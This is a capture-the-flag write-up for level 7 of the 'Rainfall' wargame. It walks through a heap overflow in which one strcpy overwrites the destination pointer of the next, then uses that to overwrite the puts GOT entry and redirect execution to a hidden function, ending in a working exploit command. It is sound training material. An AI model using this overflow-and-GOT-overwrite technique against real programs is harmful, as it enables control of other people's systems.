# Rainfall - Level 7

## Executable Analyse
Executable contain 2 functions. But only one is used.

```assembly
(gdb) info function

0x080484f4  m
0x08048521  main
```

In `main`, two strings are allocated on the heap, then consequently filled with `argv[1]`, and `argv[2]`, letting us easily overwriting  

A file descriptor with the wanted flag is opened, and put in a global variale wich is sadly never read in main.

Inaccessible `m()` function read our wanted variable. The goal is to force the program to execute the m function.

## Heap overflow

There are two calls to strcpy that can overflow using the first two arguments of main.  

With ltrace you can see how the first overflow affects the second one :  

```shell
$> ltrace ./level7 aaaaaaaaaaaaaaaaaaaabbbb test
[...]
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaabbbb")             = 0x0804a018
strcpy(0x62626262, "test")
```

After 20 chars, we can set the address where the second strcpy will write.

``` assembly
(gdb) disas puts

Dump of assembler code for function puts@plt:
   0x08048400 <+0>:		jmp    *0x8049928
   0x08048406 <+6>:		push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

Using the link puts() addr, as we did for level5, we can jump to the `m()` function and print our flag  

``` bash
./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
```